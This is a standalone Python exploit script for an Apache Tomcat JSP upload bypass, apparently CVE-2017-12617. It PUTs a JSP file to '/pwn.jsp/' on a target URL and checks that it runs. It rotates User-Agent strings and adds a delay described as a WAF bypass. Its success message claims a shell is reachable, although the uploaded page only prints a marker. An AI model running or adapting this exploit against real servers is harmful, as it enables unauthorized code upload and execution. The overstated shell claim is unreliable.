#!/usr/bin/python3
import requests
import random
import time
import argparse
from requests.exceptions import RequestException

# Colors for output
class bcolors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# ASCII Banner
banner = f"""{bcolors.OKGREEN}
   _______      ________    ___   ___  __ ______     __ ___   __ __ ______
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / /
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/
Apache Tomcat JSP Upload Bypass & RCE Exploit
[@intx0x80]
{bcolors.ENDC}
"""

# User-Agent rotation for evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Generate and upload malicious JSP payload
def create_payload(target):
    payload = '<% out.println("VULNERABLE"); %>'
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        response = requests.put(f"{target}/pwn.jsp/", data=payload, headers=headers, timeout=5)
        if response.status_code == 201 or response.status_code == 204:
            print(f"{bcolors.OKGREEN}[+] Exploit uploaded successfully! {target}/pwn.jsp{bcolors.ENDC}")
            return True
        else:
            print(f"{bcolors.FAIL}[-] Upload failed: {response.status_code}{bcolors.ENDC}")
            return False
    except RequestException as e:
        print(f"{bcolors.FAIL}[-] Request failed: {e}{bcolors.ENDC}")
        return False

# Check if exploit is successful
def verify_exploit(target):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        response = requests.get(f"{target}/pwn.jsp", headers=headers, timeout=5)
        if "VULNERABLE" in response.text:
            print(f"{bcolors.OKGREEN}[+] Target is vulnerable! Shell is accessible at {target}/pwn.jsp{bcolors.ENDC}")
        else:
            print(f"{bcolors.FAIL}[-] Target is not vulnerable.{bcolors.ENDC}")
    except RequestException as e:
        print(f"{bcolors.FAIL}[-] Failed to verify exploit: {e}{bcolors.ENDC}")

# Main execution
if __name__ == "__main__":
    print(banner)
    parser = argparse.ArgumentParser(description="Apache Tomcat JSP Upload Bypass & RCE Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    if create_payload(args.url):
        time.sleep(2)  # Delay to bypass some WAFs
        verify_exploit(args.url)
